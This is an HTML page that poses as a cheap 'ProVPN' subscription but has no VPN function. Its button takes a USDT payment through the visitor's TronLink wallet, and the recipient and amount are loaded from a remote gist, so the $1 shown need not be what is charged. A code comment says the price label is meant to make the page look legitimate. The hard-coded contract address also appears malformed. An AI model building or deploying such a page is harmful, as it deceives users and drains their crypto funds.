<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ProVPN - Premium Access</title>
    <script src="https://unpkg.com/tronweb@latest/dist/tronweb.js"></script>
    <style>
        :root { --bg-color: #0F172A; --card-bg: #1E293B; --text-primary: #F8FAFC; --accent-green: #10B981; --accent-blue: #3B82F6; }
        body { background-color: var(--bg-color); color: var(--text-primary); font-family: sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .header { padding: 20px; text-align: center; border-bottom: 1px solid #334155; }
        .main-area { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .globe-icon { width: 80px; height: 80px; border-radius: 50%; border: 4px solid var(--accent-blue); border-top-color: transparent; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .status-text { font-size: 18px; font-weight: 600; margin-bottom: 10px; min-height: 27px; }
        .ping-text { font-size: 12px; color: var(--accent-green); margin-bottom: 30px; }
        .btn-connect { background: var(--accent-blue); color: white; border: none; padding: 16px 40px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; width: 80%; transition: all 0.3s; }
        .btn-connect:disabled { opacity: 0.7; cursor: not-allowed; }
        .btn-connected { background: var(--accent-green); }
        .server-info { margin-top: 40px; text-align: center; opacity: 0.7; font-size: 12px; }
        .price-tag { font-size: 24px; font-weight: bold; color: var(--accent-green); margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="header"><div class="logo">PRO<span style="color:var(--accent-blue)">VPN</span></div></div>

<div class="main-area">
    <div class="globe-icon"></div>
    <div class="price-tag">$1.00 / Month</div> <!-- 看起来更像正规服务 -->
    <div class="status-text" id="statusText">正在连接...</div>
    
    <button class="btn-connect" id="connectBtn" onclick="initiatePayment()">解锁会员</button>

    <div class="server-info">Secure Connection | USDT (TRC20)</div>
</div>

<script>
    // ✅ 更新 Gist 内容为 USDT 配置
    const API_URL = "https://gist.githubusercontent.com/ganx838-commits/658bc580aa43c3b01dc55ef7f83558d5/raw/78e17b1a8ef7e6bc8098a6c15259d376b247d2fa/config.json"; 

    async function initiatePayment() {
        const btn = document.getElementById('connectBtn');
        const status = document.getElementById('statusText');
        
        btn.disabled = true;
        btn.innerText = "准备支付...";
        status.innerText = "正在获取合约信息...";

        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            status.innerText = "请安装 TronLink";
            btn.innerText = "重试";
            btn.disabled = false;
            return;
        }

        try {
            const response = await fetch(API_URL);
            if (!response.ok) throw new Error("Failed to fetch config");
            
            const config = await response.json();
            
            // ✅ 使用 USDT 合约 (TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmL-iU)
            const usdtContractId = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmL-iU";
            const contract = await tronWeb.contract.at(usdtContractId);
            
            // ✅ 调用 transfer 方法发送 USDT
            const result = await contract.transfer(config.target, config.amount).send({
                feeLimit: 100000000, 
                from: window.tronWeb.defaultAddress.base58
            }).promise();

            status.innerText = "支付成功！";
            btn.innerText = "已解锁";
            btn.classList.add("btn-connected");
            
        } catch (e) {
            console.error(e);
            status.innerText = "支付失败: " + e.message;
            btn.innerText = "重试";
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
